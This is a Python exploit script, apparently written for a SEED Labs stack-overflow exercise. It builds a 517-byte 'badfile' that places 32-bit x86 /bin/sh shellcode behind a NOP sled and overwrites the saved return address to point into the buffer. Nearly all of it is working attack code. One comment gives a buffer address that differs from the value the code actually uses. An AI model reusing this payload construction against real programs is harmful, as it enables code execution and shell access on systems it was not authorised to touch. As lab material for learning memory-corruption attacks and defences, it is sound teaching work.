#!/usr/bin/env python3
import struct

# /bin/sh shellcode (23 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# From gdb: &buffer = ebp - 0x20 = 0xffffca68
BUF_ADDR = 0xffffca88

# Land inside the NOP sled in front of shellcode
RET_ADDR = BUF_ADDR + 8

# Build first 36 bytes that go into buffer before saved EIP
# 10 NOPs + shellcode = 10 + 23 = 33 bytes
front = b"\x90" * 10 + shellcode

# Pad/truncate to exactly 36 bytes before the saved return address
if len(front) < 36:
    front = front + b"A" * (36 - len(front))
else:
    front = front[:36]

payload = front

# Overwrite saved EIP
payload += struct.pack("<I", RET_ADDR)

# Pad remaining bytes to reach total size 517
payload += b"C" * (517 - len(payload))

print(f"[+] BUF_ADDR   = {hex(BUF_ADDR)}")
print(f"[+] RET_ADDR   = {hex(RET_ADDR)}")
print(f"[+] Payload size: {len(payload)}")

with open("../vulnerable-programs/seedlabs-stack/badfile", "wb") as f:
    f.write(payload)

print("[+] Wrote badfile")
